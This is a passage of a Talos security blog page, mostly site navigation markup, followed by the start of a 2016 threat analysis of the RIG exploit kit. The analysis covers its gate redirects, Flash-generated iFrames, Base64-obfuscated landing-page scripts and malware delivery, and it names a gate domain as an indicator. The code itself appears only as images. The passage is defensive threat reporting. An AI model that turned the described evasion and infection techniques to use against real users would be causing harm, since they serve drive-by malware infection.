+                            </div>
+                            <div class="sub-nav-list-item-wrapper">
+                                <span class="sub-nav-desktop-header uppercase">Security Resources</span>
+                                <ul class="sub-nav-list">
+                                    <li>
+                                        <a href="https://talosintelligence.com/software"><span>Open Source Security Tools</span>
+                                        </a></li>
+                                    <li>
+                                        <a href="https://talosintelligence.com/categories"><span>Intelligence Categories Reference</span>
+                                        </a></li>
+                                    <li>
+                                        <a href="https://talosintelligence.com/secure-endpoint-naming"><span>Secure Endpoint Naming Reference</span>
+                                        </a></li>
+                                </ul>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="desktop-hide subnav-overlay"><!-- Generator: Adobe Illustrator 24.2.1, SVG Export Plug-In . SVG Version: 6.00 Build 0)  --><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1" id="Layer_1" x="0px" y="0px" viewBox="0 0 20 20" style="enable-background:new 0 0 20 20;" width="25px" height="25px" xml:space="preserve">
+                        <style type="text/css">
+                            .white{fill:#FFFFFF;}
+                        </style>
+                                                <path class="white" d="M19.4,17.1c0,0.1-0.1,0-0.2,0c0,0-1.3-0.9-2-1.4c-0.2-0.1-0.5-0.1-0.6,0.1c-0.3,0.3-0.6,0.8-0.9,1.3  c-0.1,0.2-0.1,0.5,0.1,0.6l2,1.5c0.1,0,0,0.1,0.1,0.2c0,0.1,0,0.1-0.1,0.2c-1.2,0.5-2.6,0.2-3.5-0.7c-0.8-0.9-1-2-0.7-3.1L4.5,6.5  c-1,0.3-2.3,0-3-0.9c-0.8-0.9-1.1-1.7-1-2.7c0-0.1,0-0.1,0.1-0.2c0.1,0,0.2,0.1,0.2,0.1l2,1.5C3,4.4,3.3,4.5,3.4,4.2  c0,0,0.5-0.8,0.9-1.3c0.1-0.2,0.1-0.5-0.1-0.6L2.3,0.9c-0.1,0,0-0.1-0.1-0.3c0-0.1,0-0.1,0.1-0.2C3.5-0.1,5,0.2,5.8,1.1  c0.8,0.9,1,2,0.7,3.1l9.1,9.3c1-0.3,2.3,0,3,0.9c0.7,0.7,0.9,1.5,0.9,2.5C19.5,16.9,19.5,17,19.4,17.1z"></path>
+                        </svg>
+                    </div>
+                </li>
+                <li class="nav-item">
+                    <div class="more-link-wrapper more-link-wrapper-mobile">
+                        <span class="more-nav-link">
+                            <div class="mobile-nav-icon"><!-- Generator: Adobe Illustrator 24.2.1, SVG Export Plug-In . SVG Version: 6.00 Build 0)  --><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1" id="Layer_1" x="0px" y="0px" viewBox="0 0 20 20" width="25px" height="25px" style="enable-background:new 0 0 20 20;" xml:space="preserve">
+                                <style type="text/css">
+                                    .sticoncomment{fill-rule:evenodd;clip-rule:evenodd;fill:#FFFFFF;}
+                                </style>
+                                <path class="sticoncomment" d="M13.6,7.1H6.4c-0.3,0-0.6-0.3-0.6-0.6c0-0.3,0.3-0.6,0.6-0.6l7.2,0c0.3,0,0.6,0.3,0.6,0.6  C14.2,6.8,13.9,7.1,13.6,7.1L13.6,7.1z M13.6,9.4H6.4c-0.3,0-0.6-0.3-0.6-0.6s0.3-0.6,0.6-0.6l7.2,0c0.3,0,0.6,0.3,0.6,0.6  C14.2,9.2,13.9,9.4,13.6,9.4L13.6,9.4z M11.5,11.7H6.4c-0.3,0-0.6-0.3-0.6-0.6c0-0.3,0.3-0.6,0.6-0.6h5.1c0.3,0,0.6,0.3,0.6,0.6  C12.1,11.5,11.8,11.7,11.5,11.7z M15.8,3H4.2C3.5,3,3,3.5,3,4.2V17l2.8-2.3h10c0.6,0,1.2-0.5,1.2-1.2V4.2C17,3.5,16.5,3,15.8,3  L15.8,3z"></path>
+                                </svg>
+                            </div>
+                            <span class="top-nav-link-text top-nav-more-text">
+                            Media
+                            </span>
+                        </span>
+                    </div>
+                    <input class="sub-nav-trigger" id="media-sub-trigger" type="checkbox">
+                    <label class="sub-nav-trigger-label" for="media-sub-trigger">
+                        <div class="mobile-nav-icon">
+                            <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="48.167px" height="47.75px" viewBox="0 0 48.167 47.75">
+                            <circle opacity="0.4" fill="none" stroke="#FFFFFF" stroke-miterlimit="10" cx="24.083" cy="23.875" r="22"></circle>
+                            <g>
+                                <circle fill="#FFFFFF" cx="24.083" cy="16.068" r="2.496"></circle>
+                                <circle fill="#FFFFFF" cx="24.083" cy="23.875" r="2.496"></circle>
+                                <circle fill="#FFFFFF" cx="24.083" cy="31.682" r="2.496"></circle>
+                            </g>
+                            </svg>
+                        </div>
+                    </label>
+                    <div class="sub-nav sub-nav-multiple-list sub-nav-multiple-list-middle">
+                        <div class="sub-nav-multiple-wrapper">
+                            <div class="sub-nav-list-top-of-mobile-wrapper">
+                                <h1 class="sub-nav-list-header sub-nav-list-top-of-mobile">Media</h1>
+                                <ul class="sub-nav-list">
+                                    <li class="desktop-hide">
+                                        <label class="subnav-back-button" for="media-sub-trigger">BACK</label>
+                                    </li>
+                                </ul>
+                            </div>
+                            <div class="sub-nav-list-item-wrapper">
+                                <span class="sub-nav-desktop-header uppercase">Media</span>
+                                <ul class="sub-nav-list">
+                                    <li>
+                                        <a href="https://blog.talosintelligence.com"><span>Talos Intelligence Blog</span>
+                                        </a></li>
+                                    <li>
+                                        <a href="https://blog.talosintelligence.com/category/threat-source-newsletter/"><span>Threat Source Newsletter</span>
+                                        </a></li>
+                                    <li>
+                                        <a href="https://talosintelligence.com/podcasts/shows/beers_with_talos"><span>Beers with Talos Podcast</span>
+                                        </a></li>
+                                    <li>
+                                        <a href="https://talosintelligence.com/podcasts/shows/talos_takes"><span>Talos Takes Podcast</span>
+                                        </a></li>
+                                    <li>
+                                        <a target="_blank" href="https://www.youtube.com/channel/UCPZ1DtzQkStYBSG3GTNoyfg/featured"><span>Talos Videos</span>
+                                        </a></li>
+                                </ul>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="desktop-hide subnav-overlay"><!-- Generator: Adobe Illustrator 24.2.1, SVG Export Plug-In . SVG Version: 6.00 Build 0)  --><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1" id="Layer_1" x="0px" y="0px" viewBox="0 0 20 20" width="25px" height="25px" style="enable-background:new 0 0 20 20;" xml:space="preserve">
+                        <style type="text/css">
+                            .sticoncomment{fill-rule:evenodd;clip-rule:evenodd;fill:#FFFFFF;}
+                        </style>
+                        <path class="sticoncomment" d="M13.6,7.1H6.4c-0.3,0-0.6-0.3-0.6-0.6c0-0.3,0.3-0.6,0.6-0.6l7.2,0c0.3,0,0.6,0.3,0.6,0.6  C14.2,6.8,13.9,7.1,13.6,7.1L13.6,7.1z M13.6,9.4H6.4c-0.3,0-0.6-0.3-0.6-0.6s0.3-0.6,0.6-0.6l7.2,0c0.3,0,0.6,0.3,0.6,0.6  C14.2,9.2,13.9,9.4,13.6,9.4L13.6,9.4z M11.5,11.7H6.4c-0.3,0-0.6-0.3-0.6-0.6c0-0.3,0.3-0.6,0.6-0.6h5.1c0.3,0,0.6,0.3,0.6,0.6  C12.1,11.5,11.8,11.7,11.5,11.7z M15.8,3H4.2C3.5,3,3,3.5,3,4.2V17l2.8-2.3h10c0.6,0,1.2-0.5,1.2-1.2V4.2C17,3.5,16.5,3,15.8,3  L15.8,3z"></path>
+                        </svg>
+                    </div>
+                </li>
+                <li class="nav-item">
+                    <div class="more-link-wrapper more-link-wrapper-mobile">
+                        <span class="more-nav-link">
+                            <div class="mobile-nav-icon">
+                                <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="25px" height="25px" viewBox="0 0 55 55">
+                                <g>
+                                    <g class="mobile-nav-home">
+                                        <path fill-rule="evenodd" clip-rule="evenodd" fill="#FFFFFF" d="M45.201,12.343c0.378,0.48,0.758,0.925,1.096,1.401    c2.975,4.207,4.543,8.876,4.494,14.044c-0.05,5.452-1.643,10.386-5.186,14.593c-3.484,4.133-7.929,6.73-13.182,7.895    c-6.313,1.398-12.216,0.275-17.695-3.131c-0.441-0.273-0.847-0.6-1.266-0.904c-0.11-0.078-0.208-0.174-0.337-0.287    c0.127-0.141,0.246-0.27,0.366-0.398c0.887-0.949,1.765-1.904,2.663-2.844c0.114-0.119,0.321-0.217,0.485-0.217    c3.658-0.006,7.318,0,10.975,0.008c3.458,0.006,6.913,0.02,10.369,0.02c0.957,0,1.871-0.193,2.62-0.844    c0.797-0.693,1.157-1.596,1.157-2.643c0.001-7.533,0.003-15.067-0.005-22.601c-0.002-0.309,0.088-0.524,0.3-0.743    C43.098,14.598,44.127,13.49,45.201,12.343"></path>
+                                        <path fill-rule="evenodd" clip-rule="evenodd" fill="#FFFFFF" d="M41.402,8.822c-0.99,1.027-1.994,2.021-2.935,3.072    c-0.312,0.35-0.616,0.416-1.036,0.415c-6.98-0.009-13.957-0.007-20.938-0.007c-2.039,0-3.561,1.514-3.561,3.557    c0,6.504,0.002,13.008,0.006,19.512c0.002,0.973,0.011,1.943,0.004,2.914c0,0.133-0.04,0.301-0.127,0.393    c-1.069,1.162-2.15,2.314-3.229,3.469c-0.021,0.023-0.052,0.039-0.109,0.08c-0.159-0.188-0.323-0.369-0.471-0.562    c-2.535-3.348-4.119-7.102-4.605-11.268c-0.61-5.229,0.194-10.229,2.835-14.839c2.669-4.664,6.655-7.805,11.618-9.75    c3.205-1.257,6.533-1.852,9.977-1.621c4.478,0.298,8.553,1.754,12.227,4.325c0.101,0.072,0.197,0.151,0.291,0.229    C41.364,8.755,41.374,8.778,41.402,8.822"></path>
+                                        <path fill-rule="evenodd" clip-rule="evenodd" fill="#FFFFFF" d="M39.799,12.47c0.873-0.911,1.749-1.829,2.676-2.797    c0.605,0.564,1.195,1.112,1.816,1.691c-0.941,0.985-1.817,1.903-2.703,2.83c-0.276-0.339-0.511-0.688-0.807-0.975    C40.492,12.941,40.145,12.728,39.799,12.47"></path>
+                                        <path fill-rule="evenodd" clip-rule="evenodd" fill="#FFFFFF" d="M10.35,43.279c0.969-1.016,1.885-1.977,2.76-2.893    c0.213,0.369,0.376,0.762,0.639,1.072c0.265,0.312,0.627,0.539,0.98,0.832c-0.853,0.891-1.713,1.791-2.624,2.746    C11.513,44.445,10.939,43.869,10.35,43.279"></path>
+                                    </g>
+                                </g>
+                                </svg>
+                            </div>
+                            <span class="top-nav-link-text top-nav-more-text">
+                            Company
+                            </span>
+                        </span>
+                    </div>
+                    <input class="sub-nav-trigger" id="company-sub-trigger" type="checkbox">
+                    <label class="sub-nav-trigger-label" for="company-sub-trigger">
+                        <div class="mobile-nav-icon">
+                            <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="48.167px" height="47.75px" viewBox="0 0 48.167 47.75">
+                            <circle opacity="0.4" fill="none" stroke="#FFFFFF" stroke-miterlimit="10" cx="24.083" cy="23.875" r="22"></circle>
+                            <g>
+                                <circle fill="#FFFFFF" cx="24.083" cy="16.068" r="2.496"></circle>
+                                <circle fill="#FFFFFF" cx="24.083" cy="23.875" r="2.496"></circle>
+                                <circle fill="#FFFFFF" cx="24.083" cy="31.682" r="2.496"></circle>
+                            </g>
+                        </svg>
+                        </div>
+                    </label>
+                    <div class="sub-nav sub-nav-multiple-list sub-nav-multiple-list-right">
+                        <div class="sub-nav-multiple-wrapper">
+                            <div class="sub-nav-list-top-of-mobile-wrapper">
+                                <h1 class="sub-nav-list-header sub-nav-list-top-of-mobile">Company</h1>
+                                <ul class="sub-nav-list">
+                                    <li class="desktop-hide">
+                                        <label class="subnav-back-button" for="company-sub-trigger">BACK</label>
+                                    </li>
+                                </ul>
+                            </div>
+                            <div class="sub-nav-list-item-wrapper">
+                                <span class="sub-nav-desktop-header uppercase">Company</span>
+                                <ul class="sub-nav-list">
+                                    <li>
+                                        <a href="https://talosintelligence.com/about"><span>About Talos</span>
+                                        </a></li>
+                                    <li>
+                                        <a href="https://talosintelligence.com/careers"><span>Careers</span>
+                                        </a></li>
+                                </ul>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="desktop-hide subnav-overlay"><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="25px" height="25px" viewBox="0 0 55 55">
+                        <g>
+                            <g class="mobile-nav-home">
+                                <path fill-rule="evenodd" clip-rule="evenodd" fill="#FFFFFF" d="M45.201,12.343c0.378,0.48,0.758,0.925,1.096,1.401    c2.975,4.207,4.543,8.876,4.494,14.044c-0.05,5.452-1.643,10.386-5.186,14.593c-3.484,4.133-7.929,6.73-13.182,7.895    c-6.313,1.398-12.216,0.275-17.695-3.131c-0.441-0.273-0.847-0.6-1.266-0.904c-0.11-0.078-0.208-0.174-0.337-0.287    c0.127-0.141,0.246-0.27,0.366-0.398c0.887-0.949,1.765-1.904,2.663-2.844c0.114-0.119,0.321-0.217,0.485-0.217    c3.658-0.006,7.318,0,10.975,0.008c3.458,0.006,6.913,0.02,10.369,0.02c0.957,0,1.871-0.193,2.62-0.844    c0.797-0.693,1.157-1.596,1.157-2.643c0.001-7.533,0.003-15.067-0.005-22.601c-0.002-0.309,0.088-0.524,0.3-0.743    C43.098,14.598,44.127,13.49,45.201,12.343"></path>
+                                <path fill-rule="evenodd" clip-rule="evenodd" fill="#FFFFFF" d="M41.402,8.822c-0.99,1.027-1.994,2.021-2.935,3.072    c-0.312,0.35-0.616,0.416-1.036,0.415c-6.98-0.009-13.957-0.007-20.938-0.007c-2.039,0-3.561,1.514-3.561,3.557    c0,6.504,0.002,13.008,0.006,19.512c0.002,0.973,0.011,1.943,0.004,2.914c0,0.133-0.04,0.301-0.127,0.393    c-1.069,1.162-2.15,2.314-3.229,3.469c-0.021,0.023-0.052,0.039-0.109,0.08c-0.159-0.188-0.323-0.369-0.471-0.562    c-2.535-3.348-4.119-7.102-4.605-11.268c-0.61-5.229,0.194-10.229,2.835-14.839c2.669-4.664,6.655-7.805,11.618-9.75    c3.205-1.257,6.533-1.852,9.977-1.621c4.478,0.298,8.553,1.754,12.227,4.325c0.101,0.072,0.197,0.151,0.291,0.229    C41.364,8.755,41.374,8.778,41.402,8.822"></path>
+                                <path fill-rule="evenodd" clip-rule="evenodd" fill="#FFFFFF" d="M39.799,12.47c0.873-0.911,1.749-1.829,2.676-2.797    c0.605,0.564,1.195,1.112,1.816,1.691c-0.941,0.985-1.817,1.903-2.703,2.83c-0.276-0.339-0.511-0.688-0.807-0.975    C40.492,12.941,40.145,12.728,39.799,12.47"></path>
+                                <path fill-rule="evenodd" clip-rule="evenodd" fill="#FFFFFF" d="M10.35,43.279c0.969-1.016,1.885-1.977,2.76-2.893    c0.213,0.369,0.376,0.762,0.639,1.072c0.265,0.312,0.627,0.539,0.98,0.832c-0.853,0.891-1.713,1.791-2.624,2.746    C11.513,44.445,10.939,43.869,10.35,43.279"></path>
+                            </g>
+                        </g>
+                    </svg>
+                    </div>
+                </li>
+            </ul>
+            <div class="nav-search-wrapper" id="desktop-search-wrapper">
+                <button class="search-button desktop-search-button" data-ghost-search>
+                    <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2"><path stroke-linecap="round" stroke-linejoin="round" d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z"></path></svg>
+                </button>
+            </div>
+        </div>
+
+
+
+    </div>
+</nav>
+
+    
+
+    <main id="site-main">
+
+            <div class="banner-content-wrapper">
+                <div class="container">
+                    <div class="row">
+                        <div class="col threat-spotlight-graphic banner-post-graphic"></div>
+                    </div>
+                </div>
+            </div>
+                <div class="container-fluid">
+                    <div class="row banner-bg-container banner-bg-4">
+                    </div>
+                </div>
+
+
+        <div class="container-fluid px-0">
+            <div class="main-content-row">
+                <div class="main-content-col px-0">
+                    <div class="post-full-content">
+                        
+<article class="post tag-threat-spotlight  blog-series-article">
+
+    <h1 class="text-center">Take the RIG Pill: Down the Rabbit Hole</h1>
+
+    <div class="text-center m-1">
+        <div class="post-author">
+            <span>By </span>
+                <a href="https://blog.talosintelligence.com/author/holger-unterbrink/">Holger Unterbrink</a>, 
+                <a href="https://blog.talosintelligence.com/author/christopher/">Christopher Marczewski</a>
+        </div>
+
+        <br/>
+        <time class="post-datetime" datetime="November 3, 2016 11:00">
+            Thursday, November 3, 2016 11:00
+        </time>
+
+        <div class="m-3">
+                        <a href="https://blog.talosintelligence.com/category/threat-spotlight/" class="category primary-category">
+                            Threat Spotlight
+                        </a>
+                            </div>
+    </div>
+
+    <section class="post-content-wrapper mt-5">
+        <div class="post-content" id="post-content">
+            <p>Talos is monitoring the big notorious&nbsp;<a href="https://www.blogger.com/u/1/blog/post/edit/1029833275466591797/7131721338791211667#">Exploit Kits(EK)</a>&nbsp;on an ongoing basis. Since&nbsp;<a href="https://www.blogger.com/u/1/blog/post/edit/1029833275466591797/7131721338791211667#">Angler disappeared</a>&nbsp;a few month ago, RIG is one EK which seems to be trying to fill the gap Angler has left. We see an ongoing development on&nbsp;<a href="https://www.blogger.com/u/1/blog/post/edit/1029833275466591797/7131721338791211667#">RIG</a>. This report gives more details about the complex infection process the adversaries behind RIG are using to infect their victims and how they attempt to bypass security software and devices.<br><br>The adversaries are leveraging&nbsp;<a href="https://www.blogger.com/u/1/blog/post/edit/1029833275466591797/7131721338791211667#">Gates</a>&nbsp;(e.g. EITest) to redirect the users to their Landing Page. This leads to a chain of redirects, before the victim finally gets on the landing page of the exploit kit. They are using different methods and stages to deliver the malware files. The same malware file often gets written and executed multiple times on the victim's PC. If one method doesn’t work or is blocked by an Anti-Malware solution, they have a couple of backup methods. All stages and methods are obfuscated, some more, some less.</p><p>Many communication parameters e.g. URLs, filenames, etc are individualized for different victims and sessions, which makes it more difficult to detect attacks solely by URLs or document names. We will describe those modifications in the technical details section below.</p><h2 id="infection-process-high-level-overview"><strong>Infection Process High Level Overview</strong></h2><p>In this campaign we saw mainly compromised sites, but we are aware of other campaigns redirecting to the RIG EK, where the adversaries also used Malvertising techniques to redirect users to their infection chain.</p>
+<!--kg-card-begin: html-->
+<table align="center" cellpadding="0" cellspacing="0" class="tr-caption-container" data-original-attrs="{"style":""}" style="font-family: Times; letter-spacing: normal; orphans: 2; text-transform: none; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px; text-decoration-thickness: initial; text-decoration-style: initial; text-decoration-color: initial; margin-left: auto; margin-right: auto; text-align: center;"><tbody><tr><td data-original-attrs="{"style":""}" style="text-align: center;"><a data-original-attrs="{"data-original-href":"https://2.bp.blogspot.com/-J0Lsthtlnw0/WBtJ6wCxo4I/AAAAAAAAAk4/l75bejrjUvcRF0CCUeyvH1TIbJVrYCgBACLcB/s1600/1c.jpg","style":""}" href="https://www.blogger.com/u/1/blog/post/edit/1029833275466591797/7131721338791211667#" style="margin-left: auto; margin-right: auto;"><img border="0" height="296" src="https://2.bp.blogspot.com/-J0Lsthtlnw0/WBtJ6wCxo4I/AAAAAAAAAk4/l75bejrjUvcRF0CCUeyvH1TIbJVrYCgBACLcB/s640/1c.jpg" width="640" style="cursor: move;"></a></td></tr><tr><td class="tr-caption" data-original-attrs="{"style":""}" style="text-align: center;">Fig. A</td></tr></tbody></table>
+<!--kg-card-end: html-->
+<p>In this campaign the adversaries behind the Gate have added code to the compromised sites which downloads a malicious Flash file. This Flash file itself, creates two malicious iFrames. Like the Flash file, the content of the iFrame(s) is downloaded from the Gate server.</p>
+<!--kg-card-begin: html-->
+<table align="center" cellpadding="0" cellspacing="0" class="tr-caption-container" data-original-attrs="{"style":""}" style="font-family: Times; letter-spacing: normal; orphans: 2; text-transform: none; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px; text-decoration-thickness: initial; text-decoration-style: initial; text-decoration-color: initial; margin-left: auto; margin-right: auto; text-align: center;"><tbody><tr><td data-original-attrs="{"style":""}" style="text-align: center;"><a data-original-attrs="{"data-original-href":"https://4.bp.blogspot.com/-V-gCwD9L6Ew/WBtMcCNUPJI/AAAAAAAAAlM/HN4yYCsQxu0MzgpXGbWXHKfHKJn2YPMnQCLcB/s1600/2e.jpg","style":""}" href="https://www.blogger.com/u/1/blog/post/edit/1029833275466591797/7131721338791211667#" style="margin-left: auto; margin-right: auto;"><img border="0" height="340" src="https://4.bp.blogspot.com/-V-gCwD9L6Ew/WBtMcCNUPJI/AAAAAAAAAlM/HN4yYCsQxu0MzgpXGbWXHKfHKJn2YPMnQCLcB/s640/2e.jpg" width="640" style="cursor: move;"></a></td></tr><tr><td class="tr-caption" data-original-attrs="{"style":""}" style="text-align: center;">Fig. B</td></tr></tbody></table>
+<!--kg-card-end: html-->
+<p>It is important to note, that the iFrames are not generated at the same time. The second one is generated and placed into the website a bit later after a timer in the first Flash file times out. We have also seen other campaigns where the second iFrame is not loaded and we only have one infection stage.</p>
+<!--kg-card-begin: html-->
+<table align="center" cellpadding="0" cellspacing="0" class="tr-caption-container" data-original-attrs="{"style":""}" style="margin-left: auto; margin-right: auto; text-align: center;"><tbody><tr><td data-original-attrs="{"style":""}" style="text-align: center;"><a data-original-attrs="{"data-original-href":"https://2.bp.blogspot.com/-NfRY3s5VM_g/WEFYtvok9dI/AAAAAAAAAnM/FTzsOma27I8gUX-Q_TAPPi2sQtdLaNhcgCLcB/s1600/3f.jpg","style":""}" href="https://www.blogger.com/u/1/blog/post/edit/1029833275466591797/7131721338791211667#" style="margin-left: auto; margin-right: auto;"><img border="0" height="346" src="https://2.bp.blogspot.com/-NfRY3s5VM_g/WEFYtvok9dI/AAAAAAAAAnM/FTzsOma27I8gUX-Q_TAPPi2sQtdLaNhcgCLcB/s640/3f.jpg" width="640" style="cursor: move;"></a></td></tr><tr><td class="tr-caption" data-original-attrs="{"style":""}" style="text-align: center;">Fig. C</td></tr></tbody></table>
+<!--kg-card-end: html-->
+<p>If we have a look to the first stage, the iFrame is filled with javascript code which redirects the victim to the RIG Exploit Kits landing page.</p>
+<!--kg-card-begin: html-->
+<table align="center" cellpadding="0" cellspacing="0" class="tr-caption-container" data-original-attrs="{"style":""}" style="font-family: Times; letter-spacing: normal; orphans: 2; text-transform: none; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px; text-decoration-thickness: initial; text-decoration-style: initial; text-decoration-color: initial; margin-left: auto; margin-right: auto; text-align: center;"><tbody><tr><td data-original-attrs="{"style":""}" style="text-align: center;"><a data-original-attrs="{"data-original-href":"https://4.bp.blogspot.com/-NnqRhrC2Ty8/WEFY3l360uI/AAAAAAAAAnQ/JbiUlrnVHAQxPFdo_G0OKT5iiwaR2aDkwCLcB/s1600/4d.jpg","style":""}" href="https://www.blogger.com/u/1/blog/post/edit/1029833275466591797/7131721338791211667#" style="margin-left: auto; margin-right: auto;"><img border="0" height="366" src="https://4.bp.blogspot.com/-NnqRhrC2Ty8/WEFY3l360uI/AAAAAAAAAnQ/JbiUlrnVHAQxPFdo_G0OKT5iiwaR2aDkwCLcB/s640/4d.jpg" width="640" style="cursor: move;"></a></td></tr><tr><td class="tr-caption" data-original-attrs="{"style":""}" style="text-align: center;">Fig. D</td></tr></tbody></table>
+<!--kg-card-end: html-->
+<p>As mentioned in the picture, the Landing Page is an obfuscated HTML page which includes three embedded scripts. These scripts are hidden in three JavaScript variables. The second one downloads another malicious and heavily obfuscated Flash file.</p><p><br>This variant is not the only one we saw. It seems to be that the RIG based EK(s) are flexible enough that the adversaries can change certain parameters on the fly. We have seen other campaigns which were only using a single infection stage or others which replaced the three scripts we are discussing here, with other scripts, e.g. two VBscripts and one Javascript which downloads another Flash file. The only constant is that they are usually stored in these variables called (s) and that they use Base64 to encode them. This is no big surprise. As far as we know, there is at least one other version of RIG aka RIG-v sold in the underground.</p>
+<!--kg-card-begin: html-->
+<table align="center" cellpadding="0" cellspacing="0" class="tr-caption-container" data-original-attrs="{"style":""}" style="font-family: Times; letter-spacing: normal; orphans: 2; text-transform: none; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px; text-decoration-thickness: initial; text-decoration-style: initial; text-decoration-color: initial; margin-left: auto; margin-right: auto; text-align: center;"><tbody><tr><td data-original-attrs="{"style":""}" style="text-align: center;"><a data-original-attrs="{"data-original-href":"https://4.bp.blogspot.com/-OutIxbJ7WGI/WBtPcGrnwkI/AAAAAAAAAls/N6DCzk6RKD0KG-_J5JxR-XVLLVNbo_XtwCLcB/s1600/5c.jpg","style":""}" href="https://www.blogger.com/u/1/blog/post/edit/1029833275466591797/7131721338791211667#" style="margin-left: auto; margin-right: auto;"><img border="0" height="352" src="https://4.bp.blogspot.com/-OutIxbJ7WGI/WBtPcGrnwkI/AAAAAAAAAls/N6DCzk6RKD0KG-_J5JxR-XVLLVNbo_XtwCLcB/s640/5c.jpg" width="640" style="cursor: move;"></a></td></tr><tr><td class="tr-caption" data-original-attrs="{"style":""}" style="text-align: center;">Fig. E</td></tr></tbody></table>
+<!--kg-card-end: html-->
+<p>In the end, all of these scripts are downloading and executing the same malware file which the Exploit Kit wants to install on the victim's machine.<br>After the timer mentioned in Fig. C times out, the second stage begins. With a few minor differences e.g different session numbers, the second stage is almost the same as the first one.</p>
+<!--kg-card-begin: html-->
+<table align="center" cellpadding="0" cellspacing="0" class="tr-caption-container" data-original-attrs="{"style":""}" style="font-family: Times; letter-spacing: normal; orphans: 2; text-transform: none; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px; text-decoration-thickness: initial; text-decoration-style: initial; text-decoration-color: initial; margin-left: auto; margin-right: auto; text-align: center;"><tbody><tr><td data-original-attrs="{"style":""}" style="text-align: center;"><a data-original-attrs="{"data-original-href":"https://4.bp.blogspot.com/-6RSE3wWJp5E/WEFa0luzyLI/AAAAAAAAAnc/KSP2WKu5GCAJpFBjM9YNYK4pYCUwaJhFgCLcB/s1600/6d.jpg","style":""}" href="https://www.blogger.com/u/1/blog/post/edit/1029833275466591797/7131721338791211667#" style="margin-left: auto; margin-right: auto;"><img border="0" height="366" src="https://4.bp.blogspot.com/-6RSE3wWJp5E/WEFa0luzyLI/AAAAAAAAAnc/KSP2WKu5GCAJpFBjM9YNYK4pYCUwaJhFgCLcB/s640/6d.jpg" width="640" style="cursor: move;"></a></td></tr><tr><td class="tr-caption" data-original-attrs="{"style":""}" style="text-align: center;">Fig. F</td></tr></tbody></table>
+<!--kg-card-end: html-->
+<h2 id="technical-details"><strong>Technical Details</strong></h2><p>As mentioned above, in this campaign the adversaries were using compromised websites where code similar to the following was added:<br><br>Code snippet from the initially infected site:</p>
+<!--kg-card-begin: html-->
+<table align="center" cellpadding="0" cellspacing="0" class="tr-caption-container" data-original-attrs="{"style":""}" style="font-family: Times; letter-spacing: normal; orphans: 2; text-transform: none; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px; text-decoration-thickness: initial; text-decoration-style: initial; text-decoration-color: initial; margin-left: auto; margin-right: auto; text-align: center;"><tbody><tr><td data-original-attrs="{"style":""}" style="text-align: center;"><a data-original-attrs="{"data-original-href":"https://4.bp.blogspot.com/-bxcjbN-L40E/WBi7QmclVoI/AAAAAAAAAhE/HQWkWcjh06E9QqG4xLo_bsz2vAh_9Sn2gCLcB/s1600/7a.jpg","style":""}" href="https://www.blogger.com/u/1/blog/post/edit/1029833275466591797/7131721338791211667#" style="margin-left: auto; margin-right: auto;"><img border="0" height="164" src="https://4.bp.blogspot.com/-bxcjbN-L40E/WBi7QmclVoI/AAAAAAAAAhE/HQWkWcjh06E9QqG4xLo_bsz2vAh_9Sn2gCLcB/s640/7a.jpg" width="640" style="cursor: move;"></a></td></tr><tr><td class="tr-caption" data-original-attrs="{"style":""}" style="text-align: center;">Fig. G</td></tr></tbody></table>
+<!--kg-card-end: html-->
+<p>The link to the&nbsp;<em>amocy.top</em>&nbsp;site is a good indicator for that we are facing the ElTest gate here. If the victim visits this side, it downloads a malicious flash file (SWF) which includes obfuscated ActionScript. After deobfuscation the script looks like this:</p>
+<!--kg-card-begin: html-->
+<table align="center" cellpadding="0" cellspacing="0" class="tr-caption-container" data-original-attrs="{"style":""}" style="font-family: Times; letter-spacing: normal; orphans: 2; text-transform: none; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px; text-decoration-thickness: initial; text-decoration-style: initial; text-decoration-color: initial; margin-left: auto; margin-right: auto; text-align: center;"><tbody><tr><td data-original-attrs="{"style":""}" style="text-align: center;"><a data-original-attrs="{"data-original-href":"https://2.bp.blogspot.com/-uRpEferHA5U/WBi-RkFea0I/AAAAAAAAAhQ/DxBA7M_tuGcefIHe-zjk0hD7W1oyxnTSgCLcB/s1600/8a.jpg","style":""}" href="https://www.blogger.com/u/1/blog/post/edit/1029833275466591797/7131721338791211667#" style="margin-left: auto; margin-right: auto;"><img border="0" height="366" src="https://2.bp.blogspot.com/-uRpEferHA5U/WBi-RkFea0I/AAAAAAAAAhQ/DxBA7M_tuGcefIHe-zjk0hD7W1oyxnTSgCLcB/s640/8a.jpg" width="640" style="cursor: move;"></a></td></tr><tr><td class="tr-caption" data-original-attrs="{"style":""}" style="text-align: center;">Fig. H</td></tr></tbody></table>
+<!--kg-card-end: html-->
